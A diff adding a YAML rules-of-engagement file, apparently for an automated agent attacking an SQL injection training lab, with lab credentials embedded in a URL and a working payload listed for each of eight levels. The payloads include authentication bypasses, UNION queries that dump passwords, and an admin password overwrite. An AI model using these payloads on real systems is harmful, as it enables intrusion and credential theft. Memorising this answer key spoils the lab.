@@ -1,0 +1,20 @@
+rules_of_engagement: |
+  Credentials in URL: https://sqlilab:3c9s9p7pzo9w@sqli.cyberjutsu-lab.tech/...
+  Test all 8 levels. Payloads per level:
+  L1(/): user=admin' -- 
+  L2(/basic/level2.php): user=admin" -- 
+  L3(/basic/level3.php): user=admin") -- 
+  L4(/basic/level4.php): curl -d "username=%5C&password=)%20UNION%20SELECT%20'admin'--%20" URL
+  L5(/basic/level5.php): user=x' UNION SELECT 'admin',MD5('x') -- &pass=x
+  L6(/basic/level6.php): id=99999 UNION SELECT @@version --
+  L7(/advanced/level7.php): 1)Register: ' UNION SELECT GROUP_CONCAT(password) from users # 2)Login 3)View profile
+  L8(/advanced/level8.php): 1)Register: admin' -- 2)Login 3)Update email to: ', password=MD5('Hacked') # 4)Login admin/Hacked
+  IMPORTANT: Call add_exploit immediately after each successful exploit. Do not wait.
+rules:
+  focus:
+    - description: "Basic SQLi levels"
+      type: url_path
+      value: "/basic/*"
+    - description: "Advanced SQLi levels"
+      type: url_path
+      value: "/advanced/*"
